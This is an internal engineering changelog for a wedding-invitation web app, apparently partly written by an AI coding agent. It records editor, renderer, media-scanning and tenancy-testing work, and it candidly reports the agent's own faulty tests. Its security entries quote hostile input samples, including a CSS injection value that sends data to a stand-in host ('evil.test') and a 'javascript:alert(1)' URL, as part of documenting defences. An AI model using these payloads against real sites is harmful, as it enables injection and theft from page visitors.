# Changelog

Chronological summary of changes at a coarser grain than the individual records in [`records/`](./records/). If you want to know what happened and roughly when, read this. If you want to know why it was done that way, follow the link to the record.

This is the **internal** changelog. It is not the product's user-facing release notes, and it may describe work that has not shipped.

Format follows Keep a Changelog conventions, grouped by release once releases exist. Before the first release, entries are grouped by date.

---

## Unreleased

### 2026-09-13 — The editor can say what is left, and a live page can no longer be stranded

**Added** — the publish check, end to end ([P2-06](./records/2026-09-13-P2-06-publish-check.md))

- **`GET /invitations/:id/publish-check`** returns the required fields still empty, as the same `details[]` that `POST /publish` will return in its 422. One shape, so the editor has one rendering path for "here is what is left" and "you cannot publish yet, here is why".
- **The editor shows it without a round trip** — a count in the header, a mark beside each incomplete section, and a Publish button that is visible, disabled, and explains itself through `aria-describedby` rather than a tooltip a screen reader and a touch screen both miss. It runs **the same function** the server runs, imported from `@wi/schema`: a client-side copy that disagrees with the server about what is complete is the failure this design exists to prevent, and sharing the code is the only way to guarantee it cannot.
- **No field path reaches the interface.** `couple.bride.nickname` becomes *"Nama panggilan mempelai wanita di bagian Mempelai"*, from a 24-entry label table whose coverage is asserted in both directions — an unlabelled path fails the build, and so does a label for a path nobody can store.
- A **disabled section's** required fields block nothing. A couple who turned the gift section off has no account number and is not incomplete; they made a choice. A `configurable: false` section still counts, because the template displays it whatever the settings say.

**Changed** — a published invitation's template change is now checked first (`OQ-23`, ADR-061)

- `POST /invitations/:id/change-template` re-runs the BR-4.2 required-field check against the **target** template when the invitation is `published`, and refuses with 422 `TEMPLATE_WOULD_LEAVE_PUBLISHED_INVITATION_INCOMPLETE`. Without it a live page — with however many guests already holding the link — could be moved onto a template requiring a field the couple never filled: published *and* incomplete, a state no endpoint can produce directly.
- A **draft** is deliberately not checked. A draft is expected to be incomplete, and `POST /publish` is where the rule applies to it.
- `OQ-23`'s other half — whether the change should also require a confirmation field, as BR-6.2 requires for a slug — is raised as **`OQ-24`** and left to `P3-15`, which owns the screen it would live on.

### 2026-09-12 — Phase 2 opens: the catalog, and the renderer everything else runs through

**Added** — the live preview, and a backend gap closed to make it possible ([P2-05](./records/2026-09-12-P2-05-live-preview.md))

- **The editor finally renders a real invitation**, through the same renderer the public page uses — proved by a diff test asserting identical markup. A keystroke reaches it in under 300ms **and makes no request**: both halves asserted, because a test measuring only time would pass against a fetch served by a fast local mock, which is the implementation `docs/FRONTEND/06` exists to rule out.
- **`PG-19` / ADR-060**: the editor could not reach the definition of the version its invitation is locked to. The detail response carried `template_id` and `template_version_id` as bare uuids, every catalogue endpoint is addressed by slug and semver, and `GET /templates/:slug` serves the *newest* version — which BR-3.1 makes the one answer certain to be wrong for an existing invitation. The detail now carries `template: { slug, name, version }`, and not the definition itself: a definition changes a few times a year and an invitation on every keystroke, so they belong on different cache lifetimes.

**Fixed** — the editor's three-column desktop layout, which had never worked

DF-11 was raised because "the desktop layout has never been executed by anything", and it was right in the strongest sense. `P1-22` restored hidden panels with `md:block`, and Tailwind v4's preflight contains `[hidden]:where(:not([hidden=until-found])){display:none!important}` — so every inactive panel stayed hidden at every width. jsdom evaluates no media queries, so no unit test could see it.

The obvious fix is also wrong: `md:block!` has equal specificity and later source order, but for **important** declarations the CSS cascade reverses layer order, so preflight's `base` layer beats anything in `utilities`. The fix is the `hidden` class, where both declarations are ordinary and the variant wins by ordinary rules. Three build-and-test cycles, and the answer only came from probing `getComputedStyle` in a real browser instead of reasoning about specificity.

**Worth knowing** — `toBeHidden()` passes for an element that is not in the DOM at all.

The paired mobile assertion was green throughout, including while its desktop twin could not find the element — because two of those cycles went on a test that navigated to `/` instead of `/workbench`. Every panel is now asserted attached before it is asserted hidden. Any Playwright assertion that something is *not* visible needs that pairing, or it silently stops testing anything the moment a selector drifts.

**Added** — all three error boundary levels, and the editor protection ([P2-04](./records/2026-09-12-P2-04-error-boundaries.md))

- **One broken section never takes down an invitation.** `docs/FRONTEND/08` states the stake plainly: RSVP and event details "must never disappear because another section broke". A guest who cannot find the venue because a gallery row is corrupt is the outcome this prevents, on a page hundreds of people open from a WhatsApp link at a time nobody is watching a dashboard.
- **The editor's boundary is the expensive one.** On the public page a broken section costs a guest some content; in the editor an unhandled render error unmounts everything and takes the properties panel and every unsaved keystroke with it — losing by a different route exactly what `P1-22` protects on the save path.
- **A failed section shows nothing on the public page and a message in the editor.** Different audiences: a guest cannot act on it and an error box in a wedding invitation is worse for the couple than a missing section, while the person in the editor *is* the one who needs to know — and needs to know their edits are safe.
- **The report carries no section data.** The obvious thing to attach to a render error is the props that caused it, and for this renderer those props are sometimes the couple's bank account numbers (`docs/SECURITY/09`). It reports the section key, the component and the error; `invitation_id` is the caller's to add, because the renderer has no concept of which invitation it is showing.
- **Route and app-root pages show no error message or digest.** An unhandled error's text can carry an internal path or an identifier, and an error page is read by whoever is at the screen — and anyone behind them.

**Still a seam**: nothing forwards these reports to error tracking yet. A boundary makes a crash quiet, which is the point and also the risk — a section failing for every invitation now fails invisibly until somebody notices a missing gallery.

**Added** — the ten sections every template is assembled from ([P2-03](./records/2026-09-12-P2-03-section-components.md))

- **Not one colour and not one font name in them.** Every visual value is `var(--…)`, set from the template's theme, and the guard now fails the build for a literal — mutation-verified. The single exemption is the hero's achromatic scrim: a cover photo is chosen by the couple and can be any brightness, so darkening the image is the only way to guarantee contrast, and making that themeable would let a template author break `docs/UI-UX/17`.
- **The countdown survives hydration.** A server-rendered second count is guaranteed to disagree with the client's by the time React hydrates, so the server emits labels and an em dash and the browser fills in the numbers. It counts toward the nearest event that has not started — a guest opening the link between the akad and the reception should not see a number counting up — and reads stored times as WIB, so a guest abroad is not shown a countdown seven hours out.
- **No map SDK**, per ADR-014: a deep link built from the stored coordinates, with `javascript:` refused a second time in case `P1-12` ever stops refusing it first.
- **RSVP and Guestbook are disabled and say so.** Their wiring is Phase 4; a live-looking form whose handler is missing is the failure where a guest types a message, presses send, sees nothing, and concludes the invitation is broken.

**Worth knowing** — `.jsx` import specifiers built cleanly and broke the consumer.

TypeScript accepts `./HeroClassic.jsx` as referring to a `.tsx` source and emits that specifier **verbatim** — but the emitted file is `.js`. The package's own tests passed throughout, because they resolve from source. Only the two tests `P2-02` insisted on — one per consuming application, importing the built package — caught it. Without them this surfaces during `P2-08`, a card away from the change that caused it.

**Not done, and named**: the visual regression snapshots `docs/FRONTEND/10` asks for. They need a browser that renders pixels; a jsdom snapshot compares empty boxes and passes forever. Moved onto `P2-13`, which already opens these pages for Core Web Vitals — along with the contrast-over-a-photograph measurement, which is the half of the accessibility DoD jsdom structurally cannot check.

**Added** — the generic renderer, and the guard that keeps it generic ([P2-02](./records/2026-09-12-P2-02-generic-renderer-core.md))

- **`CLAUDE.md`'s first non-negotiable, made executable.** One `<TemplateRenderer>`, imported and rendered by both frontends, implementing `docs/FRONTEND/04`'s five render steps including the `configurable: false` exception. Nothing in the package knows the name of a single template.
- **And guarded.** `check-renderer-is-generic.mjs` forbids a template **identifier** anywhere in the package — not merely a branch on one, because a value that cannot be named cannot be branched on. It also forbids `dangerouslySetInnerHTML` and any network call, the two things that would end the "one renderer, three surfaces" claim. Mutation-verified by branching on a slug.
- **A disabled section is not in the DOM.** A `display:none` gift section still ships the couple's account numbers to every guest who views source, so the test searches `innerHTML` for the number — from `public-invite`, which is the surface it matters on.
- **The parity test ADR-037 has owed since `P0-20`.** The API validates a stored template's component name against a list of **strings**; until now nothing proved those strings corresponded to code. Both directions: a name with no component would render nothing, and a component with no name is code no stored template could ever reach.
- **The reference template renders**, read from the seed JSON rather than a copy. `P0-21` proved the template and its demo invitation complete against each other; what was unproven was that they render at all.

**Worth knowing** — I wrote an assertion that could not fail.

`expect(screen.getByTestId ?? true).toBeTruthy()` — a function reference, always truthy, in a test named "renders nothing at all for a template with no sections". It passed, it looked like a test, and it asserted nothing. Replaced with the real property. Worth recording because it is the failure mode this project keeps finding in code written by others, and this one was written here while assembling a long file.

**Added** — the three catalog reads and the application cache they sit behind ([P2-01](./records/2026-09-12-P2-01-template-catalog.md))

- **The card the rest of Phase 2 waits on**, and the one Phase 1's editor was already blocked by: the creation wizard renders `templates={[]}` with a comment saying so.
- **Unreleased work stays invisible.** A template appears only if it has a published version — both levels checked, because a published template whose every version is a draft has nothing to render. A deprecated version stays renderable for invitations locked to it (BR-3.3) and is gone from the catalog. A draft is refused even when named explicitly: deprecated versions were released, drafts never were.
- **Invalidation is a generation counter.** `SCAN` + `DEL` over `tpl:*` walks a keyspace shared with rate limiting and the queue, is not atomic, and misses keys written mid-sweep. Every key carries a generation instead, and a publish is one `INCR`.
- **The cache fails open everywhere.** `CachePort` never throws, so an unreachable Redis makes the catalog slower and never unavailable — proved by running the whole service against a Redis on a dead port.
- **Anonymous, deliberately** (ADR-059). `docs/UI-UX/11` has a visitor browsing the catalog before they register; a 401 would block exactly the people it exists for. `/api/v1` is a routing namespace whose default is authentication, not a guarantee of it.

**Fixed** — a flaky test that had been in the suite since `P1-19`

`gallery.itest.ts` built its "foreign id" by rewriting a real uuid's last character to `"0"`. Whenever that uuid already ended in `0` the "foreign" id was the same id, the list was a valid permutation, the reorder correctly succeeded and the test failed — one run in sixteen. A third distinct failure mode for this project's collection: not a test that verified less than its name, nor code that did less than the document, but a test whose **fixture** was occasionally not the thing the test was named after.

### 2026-09-12 — the first deploy of Phase 1, and what it found

**Fixed** — the rate limiter's cold start ([P1-07](./records/2026-09-12-P1-07-rate-limiter-cold-start.md))

- **The first credential request after any API restart answered 503.** Redis was healthy and reachable from inside the same container; `lazyConnect` plus `enableOfflineQueue: false` rejects the first command outright rather than holding it for the handshake, so the limiter concluded Redis was unavailable and failed closed — which is ADR-050 working correctly on a false premise. One `await redis.connect()` at module init.
- **No test could have caught it.** All 33 existing limiter tests build their client *without* `lazyConnect` and ping it in `beforeAll` — the harness had already done the thing production had not. The two new tests that matter boot the real `AppModule` and ask the container for the client the guard will actually use.
- **`/readyz` did not notice.** It checks the database and nothing else, so the container reported healthy while half its dependencies were unreachable. Raised as a follow-up before Phase 3 puts payments on the same Redis.

**Fixed** — readiness checks Redis, which the specification always asked for ([P0-13](./records/2026-09-12-P0-13-readyz-checks-redis.md))

`docs/DEVOPS/05` § Health Check names both dependencies in one sentence — "connectivity to critical dependencies (DB, Redis)" — and only the database was ever checked. It probes the **limiter's own client** rather than opening a socket of its own, because the server being reachable was never the question: during `P1-07` a raw `PING` from inside the container worked while the application's client could not issue a command, and a private connection would have reported healthy right through it.

Worth separating from the usual failure in this project: most defects here have been tests that verified less than their names claimed. This was a test that verified exactly what the code did, while the code did less than the document said. No mutation test finds that — the code and its tests agreed, and only the specification disagreed.

**Changed** — staging can run Phase 1 at all ([P0-23](./records/2026-09-11-P0-23-staging-deploy.md))

Three things the staging compose predated, none of them visible to any test: the API had no `JWT_SIGNING_KEY` or `REFRESH_TOKEN_PEPPER` and would have exited 78 forever; the web-app image had no build argument for `NEXT_PUBLIC_API_BASE_URL` and would have shipped a bundle calling `http://localhost:3000` — the visitor's own machine — while the page rendered perfectly; and the tunnel does not route `/api/*` at all, which is a Cloudflare-side rule and not in this repository. `deploy/STAGING-DEPLOY.md` is the runbook, with the reasons the order matters.

### 2026-09-12 — Phase 1 closes against evidence

**Added** — the IDOR sweep, the mass-assignment sweep, the acceptance suite and a coverage command ([P1-25](./records/2026-09-12-P1-25-phase-1-acceptance.md)), plus the [phase summary](./records/2026-09-12-PHASE-1-SUMMARY.md)

- **Every `:id` endpoint in the phase, swept over HTTP against the real application.** 24 endpoints × 4 cases: a non-owner, a foreign child id under a parent the caller owns, **the caller's own other wedding**, and the owner. Every response body is searched for five values unique to the other tenant. The matrix is **generated by the run** into `MEMORY/records/2026-09-12-P1-25-idor-matrix.md` — a hand-written one can claim a pass the suite never produced.
- **Twelve write endpoints, poisoned with `owner_id`, `role`, `status`, `id` and friends.** The assertion is the column, not the status code: Zod's default strips and `.strict()` rejects, and both are safe.
- **The acceptance criteria `docs/PLAN/17` states for this phase**, each as a named test: a hundred consecutive saves with the hundredth value proved in the table *and* through the read path; a template round trip with six child tables counted; the upload abuse set at the endpoint; p95 on the CRUD endpoints.
- **`docs/TESTING/04`'s XSS test, which was in no card's step list.** `P1-16`'s unit suite is thorough and tests the sanitiser — a registry entry the controller never reaches would pass all of it and store markup. Twelve columns are now read straight out of the tables after a payload goes through the routes.
- **Service-layer coverage is measurable**: `pnpm --filter @wi/api test:coverage`, 97.24% lines against the document's 80% floor.

**Worth knowing** — the first mutation test showed the sweep could not see the bug it was aimed at.

Removing the parent constraint from `updateEvent` changed nothing the cross-tenant sweep could detect: Mallory is still refused, because the remaining condition checks that the event's own invitation belongs to the caller. The corruption is between **one user's own two weddings** — not a leak, and still the endpoint writing to a wedding the user did not name. Every tenant now has a second invitation and the sweep has a fourth case. It still takes both layers broken to fail, which is the sixth time in this project that defence in depth has made a layer untestable from outside, and is why `P1-12`'s repository-level tests stay.

**Still true and now more expensive**: none of this runs anywhere automatically. `P0-17` is deferred (ADR-028, DF-10), so 762 integration tests, the coverage floor, SAST and CVE scanning run only when a person types the command. Revisit before Phase 3 touches payment code.

### 2026-09-12 — ten photos, and the reorder that works without a mouse

**Added** — the upload queue, the gallery manager and the map picker ([P1-24](./records/2026-09-12-P1-24-media-manager.md))

- **Ten files selected at once all arrive.** Three upload concurrently — the cap is about the user's connection, not the server's capacity — and a rejected photo is removed from the running set without taking the batch with it. A retry re-enters the **same item**, so its place in the list and its local preview survive.
- **Polling has two terminal cases and neither is a spinner.** `P1-18`'s `failed` verdict is permanent and becomes a failed item; a two-minute timeout covers a job that was never enqueued, because `P0-15`'s producer swallows that failure by design.
- **Reordering is operable by keyboard because that is the only mechanism there is.** Move up and move down carry their position in the accessible name; a debounced sender makes one call per pause with the final arrangement, instead of eight calls each carrying a different complete order and landing out of sequence.
- **The map is the convenience and the two coordinate inputs are the control.** MapLibre needs WebGL, which jsdom does not have and some browsers disable, so the fields are what the user actually fills in and the map writes into them. Coordinates are rounded to the six decimal places `DECIMAL(9,6)` stores, so the value shown is the value that comes back.

**Worth knowing** — the hard-coding guard caught `"gallery"` a second time, and it was a different `"gallery"`.

`form.append("purpose", "gallery")` names a **media purpose**; `P1-23`'s guard sees a section key. It cannot tell them apart in a string literal and should not try. `MEDIA_PURPOSES` moved into `@wi/schema` — the vocabulary the API already validates against — so the component imports the value, the guard stays strict, and there is one definition instead of two.

**Not built, and said rather than faked**: drag-to-reorder (the keyboard path is the requirement and is delivered), and the undo toast `docs/FRONTEND/05` suggests on delete — the media is soft-deleted and recoverable in principle, but re-attaching it needs an endpoint accepting a soft-deleted media id, which `P1-19` deliberately refuses.

### 2026-09-12 — the schema-driven form, and a guard that caught its own author

**Added** — the properties panel and `scripts/check-no-hardcoded-fields.mjs` ([P1-23](./records/2026-09-12-P1-23-properties-panel.md))

- **The form is a loop over the template's own lists.** Adding a field to a section's `required_fields` changes the rendered form with **no frontend change at all** — demonstrated by rendering twice with one string different in a fixture.
- **Two registries, one vocabulary.** `@wi/schema` owns the paths and is shared with the backend; the frontend registry adds labels, control types and column widths. A test asserts both directions, so adding a field to `docs/PLAN/08` without a label fails the frontend build.
- **Client validation mirrors the server and never replaces it**, including the `^https?://` check `P1-12` added after measuring that Zod's `.url()` accepts `javascript:alert(1)`. An invalid value is still **sent** — a mirror that is stricter than the original silently blocks legitimate input.
- **It deliberately does not sanitize.** `docs/SECURITY/08` puts that on the server and `P1-16` built it there; a frontend that stripped tags would make the server's sanitiser look unnecessary to whoever reads the code next. There is a test asserting the client leaves a script tag alone.

**Worth knowing** — `CLAUDE.md`'s first "what not to do" is now a build guard, and it caught one of its own author's files on the first run.

No component may name a section key or a canonical field path. `defaultGroupFor` in `autosave.ts` held `couple`, `events` and `bank_accounts` — a second home for the field vocabulary in a file whose job is timing and queuing. It moved to `transport.ts`, which already held the endpoint table, so exactly one file knows the mapping. The workbench's Tabs story used real section keys as demo ids and was **renamed rather than exempted**: an exemption would be a hole in the guard for the sake of a fixture.

The guard reads both vocabularies from `@wi/schema`'s **source** rather than its build, because it runs before the build step — and a copy inside the guard would drift from the thing it guards, which is the one failure that makes a guard worse than useless.

### 2026-09-12 — the editor, where the whole guarantee is that nothing is lost

**Added** — the three-column editor, its store and its autosave ([P1-22](./records/2026-09-12-P1-22-editor-shell.md))

- **A failed save keeps everything.** `markFailed` does not touch the data or the dirty set: the work is still unsaved, so it is still dirty, and the retry has something to resend.
- **`markSaved` clears only the fields that were in flight**, and this is the subtle one. A `dirtyFields.clear()` passes every happy-path test and silently drops every keystroke typed while a request was out — the field is marked saved and never sent.
- **One request at a time, one per pause, one per sub-resource.** Two overlapping PATCHes to one endpoint can land in either order and the loser silently wins, so a flush during a save asks the running cycle to go round again rather than starting a second.
- **The indicator's states are exhaustive**, with no `else` rendering "Saved" because nothing else matched. The window between an edit and its save is exactly where work exists only in the browser, and it reads "unsaved".
- The conflict check carries a two-second tolerance, because the client's own save moves `updated_at` forward and a plain "newer than known" comparison would warn on every second save.

**Worth knowing** — two of the tests were passing for the wrong reason, and one of the harnesses was testing nothing.

The React harness injected a whole `AutosaveManager`. The provider builds its own, so the injected one was never used — and had it been, it carried the test's no-op callbacks rather than the provider's, which are what connect a save to the store. Either way the suite would have been green while the indicator never moved. The provider now takes a **transport**, which is the seam that actually exists.

Separately, with a 10ms debounce the save completes before the assertion runs, so "says unsaved between an edit and the save" was asserting a state it never observed.

**And one real bug the tests found**: the conflict warning sat inside the preview panel, and on mobile the panels are tabs — so somebody editing in the properties tab could never see a warning about the thing they were doing.

### 2026-09-12 — the dashboard, and a card whose surface label was wrong

**Added** — `/dashboard`, `/dashboard/new`, and `GET /invitations/slug-available` ([P1-21](./records/2026-09-12-P1-21-dashboard-and-wizard.md))

- **The badge comes from the design system map**, and the test reads the label back out of `@wi/ui` rather than restating it — so a card that rendered its own badge would fail the assertion the moment the two diverged.
- **Two empty states.** Somebody with no invitations needs to create one; somebody whose *filter* matched nothing needs the filter cleared. The single-message version tells a user with twelve invitations to create their first.
- **The address is shown only once published.** A slug exists earlier — the wizard sets one — but the page does not, and showing the address would invite the couple to share a link that 404s.
- The local slug rules mirror the server's **format** and deliberately not its **blocklist**: that lives in a table an admin edits without a deploy, so a copy would be wrong the first time somebody added a word.

**Worth knowing** — the card says `Surface: web-app` and its definition of done could not be met from the frontend alone.

"Slug availability is checked before submission" needs something to check with, and `docs/API/04` specified nothing: creation and settings both discover a collision by **failing**, which is correct for them and poor for somebody typing into a wizard. `P1-09`'s service already answered the question; only the route was missing.

So `GET /invitations/slug-available` exists, and it is **advisory** (ADR-057). It cannot reserve anything — between its answer and the `POST` another user can claim the address — and a reservation would need a lock held across somebody's typing, an expiry, and a release for a wizard abandoned halfway. The wizard shows the check *and* handles the 409, and that second path has its own test.

**Also** — the endpoint answered 404 at first, because `@Get(":id")` was declared above it and Nest matches routes in declaration order. It read as a missing endpoint rather than a routing mistake, and the fix is positional: a test now asserts the response *shape*, not only the status, because moving a method would undo it silently.

### 2026-09-12 — the first real screens, and an open redirect that was never built

**Added** — login, register, forgot password, reset password and verify email ([P1-20](./records/2026-09-12-P1-20-auth-screens.md))

- **The access token is in memory and nowhere else**, so a reload starts with none and one refresh in flight. That makes `restoring` a **third** auth state rather than a slow `anonymous`: a guard that conflated them would bounce every reload of every protected page to login and back a second later.
- **`safeNext` is an allowlist, not a sanitiser.** The post-login destination arrives in a query parameter, so anybody can choose it — and a login page is the worst place in a product for an open redirect. Twelve rejection cases, including the three that look like paths.
- **The query string travels with the path**, because the template a user picked before signing in is in it. Keeping only the path would strand them on an empty creation screen, which is the exact complaint `docs/UI-UX/11` exists to prevent.
- **The screens never distinguish what the server refuses to distinguish**: one message for wrong credentials and it is *not* attached to the email field, one confirmation for registration, "if that address is registered" for a password reset. The backend spent two tasks removing user enumeration and a helpful frontend is the easiest place to hand it back.
- A 429 now says **how long**: `Retry-After` is read by `@wi/api-client` and rendered as "coba lagi dalam 2 menit". A user who does not know will retry immediately and spend the rest of their budget.

**Worth knowing** — axe in jsdom **cannot run `color-contrast`**. There is no layout engine, so every element has zero size and no computed colour, and five screens passing the jsdom pass say nothing about `docs/UI-UX/08`'s 4.5:1 requirement. The browser suite covers it and contains a test asserting the rule *actually ran* — without that, the browser pass could quietly degrade to jsdom's subset while every test stayed green.

### 2026-09-12 — the gallery, where an entry is a placement rather than a photo

**Added** — the five gallery endpoints ([P1-19](./records/2026-09-12-P1-19-gallery.md))

- **A gallery entry is a placement, not a photo.** The photo is the `media` row; the entry says where on this invitation it appears. That separation is what makes `docs/PLAN/11` § Deletion coherent — removing a photo deletes a *placement* and **soft**-deletes a *file*, with the status left at `ready` because the photo was fine: it is retired, not rejected.
- **Only `ready` media may be attached.** A `processing` row has not been scanned, decoded or EXIF-stripped and a `failed` one has no file; attaching either puts an unscanned image on a page hundreds of guests open.
- **"Not this invitation's media" is a 404**, never a 422. The id arrives in a request body, so `docs/SECURITY/05` § 6 applies and a helpful "that photo is not ready yet" would confirm the id exists. The predicate is `media.invitation_id = :this_invitation` rather than "does this user own it" — a photo from the user's *other* wedding is still the wrong photo, which is the distinction `P1-11` found on `photo_media_id`.
- **Exactly one cover**, cleared by both paths that can set one. A mutation removing it from only the update path fails one test and not the other, which is why both tests exist.
- **Reorder is wholesale or nothing.** A list containing a foreign id, a missing id, a duplicate or an extra changes nothing at all. The foreign-id half is a tenancy control as much as a validation rule: without it, another invitation's photo would have its order rewritten by a request shaped like a preference.

**Also fixed** — `password.spec.ts`'s timing test had failed two gates as a **timeout**, not on its assertion: fifteen argon2 operations at 64 MiB against vitest's 5s default, under the full suite in parallel. It had been noted as "probably flaky" at the start of the session and left; acting on that guess a week later would have been the same work at a worse moment.

### 2026-09-12 — the media worker, and six tasks of jobs that went nowhere

**Added** — `media.process` and `media_cleanup_staging` ([P1-18](./records/2026-09-12-P1-18-media-processing-worker.md))

- **A file becomes `ready` only after it has been scanned, decoded and stripped**, and every other decision protects that sentence. A scanner that cannot answer raises rather than returning `clean`; a scan failure is retried rather than resolved into a verdict; the permanent bucket is written only after both pass. The ordering is asserted directly — which of `scan` and `put` ran first — rather than inferred from the order of the source.
- **The dimension check runs on the header.** `metadata()` parses a few hundred bytes where `resize()` allocates width × height × channels: a 40000 × 40000 PNG is a 200 KB file and a 4.8 GB buffer.
- **The EXIF strip is an absence** — sharp drops metadata unless asked to keep it — so the test reads the output bytes back rather than trusting the default, and greps them for the tag text as well. `docs/SECURITY/09` treats a couple's GPS coordinates on a public page as a privacy incident.
- **The media pool refuses to start without a malware scanner.** `MEDIA_SCAN_DISABLED=true` exists for a laptop with no container, is refused outright in staging and production, and is logged loudly on every boot where it is used.
- `OQ-19` closed (ADR-055): three variants, and `original` was always another name for `large` — `docs/PLAN/11` said so and the sentence had been overlooked.

**Worth knowing** — **no job the API had ever enqueued could be consumed.**

The producer added jobs to a BullMQ queue named after the **pool**; `JobRunner` creates one `new Worker(jobName)` per registered job, so it consumes a queue named after the **job**. The payloads disagreed too: raw data where the runner reads an envelope. The cron scheduler had the same shape.

`P1-02`'s eight `notification.send` calls had been going nowhere for six tasks. Nothing noticed because an unconsumed queue and an unregistered handler are indistinguishable from outside, and no handler had ever been registered. `P1-18` is the first task where a job had to actually run, so it is the task that found it. ADR-056, with a test on each side — including one named *"a job addressed to the POOL is never delivered"*, which encodes the old bug as a bug.

**Also** — the repository's conditional writes passed a mutation until repository-level tests were added, which is `P1-12`'s finding for the fifth time. And the first EICAR test was wrong rather than the code: it padded the test string past 128 bytes, where the specification stops defining it, and ClamAV was right to call the result clean.

### 2026-09-12 — media upload, and a concurrency test that could not see the race

**Added** — `POST /invitations/:id/media` and `GET /media/:media_id` ([P1-17](./records/2026-09-12-P1-17-media-upload.md))

- **The bytes decide.** A filename is a string the client chose; a `Content-Type` is a header the client typed. The extension is checked because it is free, the header is logged when it disagrees, and the magic bytes refuse — `docs/SECURITY/06` layer 3, the check that catches a webshell renamed `.jpg`. Every content rejection carries the same code and message: which layer refused is useful only to somebody deciding which layer to work around next.
- **The filename cannot reach a storage path**, rather than being cleaned out of one. The object is `uploads/{media_id}`, `stagingKey()` accepts nothing but a UUID, and `check-storage-paths.mjs` refuses a hand-assembled key anywhere in the repository.
- **The 200-photo quota is held under a row lock** on the invitation, with the owner predicate on the same statement — so a non-owner takes no lock, learns no count and inserts nothing.
- Nothing is written to the permanent bucket. BR-8.2: the worker publishes, after the scan, the decode and the EXIF strip.
- `media` added to the tenant-scope guard. It was missing, and a `media` row with an `invitation_id` is a couple's photo.
- `docs/API/05` amended: § Limits still named "Basic 5MB, Premium 10MB" packages that ADR-023 removed.

**Worth knowing** — the concurrency test passed with the lock removed. Twice.

Two parallel uploads at the quota boundary, asserting exactly one succeeds: passed with `FOR UPDATE` deleted. Eight parallel uploads: also passed. node-postgres and the foreign key's own `FOR KEY SHARE` happen to serialise the inserts often enough that the race never occurs on this machine, so the test proved nothing while reporting green.

The replacement is a deterministic probe rather than more parallelism: a second connection holds `FOR NO KEY UPDATE` on the invitation row, and the test asserts the upload does not complete while it is held. The lock mode is the whole trick — `FOR NO KEY UPDATE` conflicts with `FOR UPDATE` and does **not** conflict with the `FOR KEY SHARE` that the media insert's foreign key takes on its own, so an upload that blocks can only be blocking on the quota lock. A `FOR UPDATE` probe would have passed either way.

**Stated rather than implied** — a file that reaches `processing` has been checked for three things, and a polyglot with a valid JPEG header passes all of them. There is a test named for that, asserting it is accepted. The decode and the malware scan are `P1-18`'s.

### 2026-09-12 — changing a template, where the whole feature is what the code does not do

**Added** — `POST /invitations/:id/change-template` ([P1-15](./records/2026-09-12-P1-15-change-template.md))

- **Nothing is deleted.** BR-4.1 makes "this template has no gallery" a rendering decision, never a storage one, and `docs/PLAN/17` makes it an acceptance criterion for the product. Proven three ways: row counts across all seven child tables, an A → B → A round trip comparing every row including the gallery photo ids, and a source-level test that reads the service and the repository method and fails on the word `delete`. The three protect each other — removing one because "the others cover it" removes the case the others do not.
- **The section recompute keys on the old template's section list, not the old selection.** A section the old template offered and the user deliberately switched off stays off; only a section genuinely new to that user arrives in its default state. The two readings differ on exactly the case a user notices — turn the gallery off, change template, find it back on the page.
- A section the **new** template marks non-configurable is forced on, because `P1-14` refuses to let anyone disable one: the alternative is a stored selection the API itself wrote and will then reject on every later save.
- Theme overrides the new template does not permit are **dropped** and named in the response (ADR-054). The line between that and BR-4.1 is who owns the key namespace: a gallery photo is the couple's and a template only decides whether to show it, whereas `colors.accent` means whatever this template says it means.
- `docs/API/04` amended with the response shape, which it had not specified.

**Worth knowing** — the service-level IDOR test did **not** catch a deliberately removed owner filter. Only the repository-level one did, because `requireOwnership` had already refused the request before the repository was reached. That is `P1-12`'s finding confirmed for the fourth time: **defence in depth makes each layer untestable from outside**, and every remaining sub-resource task needs repository-level tests rather than only service-level ones.

**Raised, not decided** — OQ-23: may a *published* invitation change template, and must the publish check re-run? Nothing in `docs/` forbids it, so it is allowed and logged at `warn`; but BR-4.2's required-field check does not re-run, so a live page can end up incomplete. Needs an answer before `P2-06`. Separately, PG-16 (`upgrade-template-version`, promised by BR-3.2) still has no owning task card — the mechanism is nearly identical to this endpoint's, which is exactly why folding it in would have hidden the gap.

### 2026-09-12 — settings, and a CSS injection that a build guard surfaced

**Added** — `GET`/`PATCH /invitations/:id/settings` ([P1-14](./records/2026-09-12-P1-14-settings-and-slug-rules.md))

- One domain object over two tables (`docs/PLAN/08` § Where Settings Fields Physically Live): `slug` is a column on `invitations` because it is on the public request path, the toggles live on `invitation_settings`, and the service writes to whichever owns the column. Users should not have to know the schema to change a setting.
- **The boundary rejects rather than silently ignoring.** A section key the template does not define, or a theme key outside `customizable_theme_keys`, is refused — because stored-and-ignored is the failure that looks like success: the API returns 200, the page does not change, and nothing anywhere says why.
- Validation reads the invitation's **locked** template version, not the template's newest. BR-3.1 locks a version at creation, and using the newest would start rejecting saves on old invitations the moment an admin published a template that dropped a section.
- A slug change is gated on `published_at IS NULL`, **not** `status != 'published'`. BR-6.2's reason is that old links break, and unpublishing does not un-share the links people already hold.
- A concurrent slug claim is a **409**, not a 500 — Postgres `23505` caught by code rather than by message.

**Worth knowing** — `theme_override` had validated **keys** and completely unvalidated **values**.

A theme value becomes a **CSS custom property on the public page**, and unlike a template definition — which is admin-authored — an override comes from an end user. `red; background: url(https://evil.test/?c=…)` would have been a CSS injection reaching every guest who opened the invitation. Eight injection shapes are now rejected, reusing `HEX_COLOR` and `CSS_TOKEN` from `@wi/schema` rather than new patterns, so a user's override is held to exactly what a template definition is held to. Removing the check fails eleven tests.

It was found because `check-sanitized-fields` refused the field as unregistered, and writing the exemption reason forced the question *"so what does protect this field, then?"* — at which point the answer was visibly missing. That is `P1-16`'s real value: not catching unsanitized prose, but making somebody state the defence for each field.

### 2026-09-12 — gift accounts, where the threat is substitution rather than disclosure

**Added** — gift account CRUD and the quote endpoint ([P1-13](./records/2026-09-12-P1-13-gift-accounts-and-quote.md))

The threat model here is inverted from the rest of the product, and the controls follow from that. A gift account number is **data the couple enters in order to publish it** — on a live invitation with the gift section on, it is already served to every guest who opens the link. Disclosure costs them almost nothing. **Substitution costs them everything their guests sent** (`docs/PLAN/18` R16): an attacker who swaps the number on a published invitation collects the lot, and the couple may not find out until after the wedding.

So:

- **Every create, update and delete writes an audit row inside its own transaction**, and the audit callback is a *required argument* of each write — a caller cannot obtain the change without supplying the trail. A test proves a failing audit rolls the change back, because "in the same transaction" is a claim and a test is what makes it a fact.
- Audit rows carry a **masked** number. `docs/DATABASE/10` § Policy asks to avoid duplicating this data, and two years of retention over a table of full account numbers would be a larger liability than the one it warns about.
- **A change to a published invitation notifies the owner**, the way a bank confirms a payee change. Silent on a draft, deliberately: an email per keystroke trains somebody to ignore the one that matters.
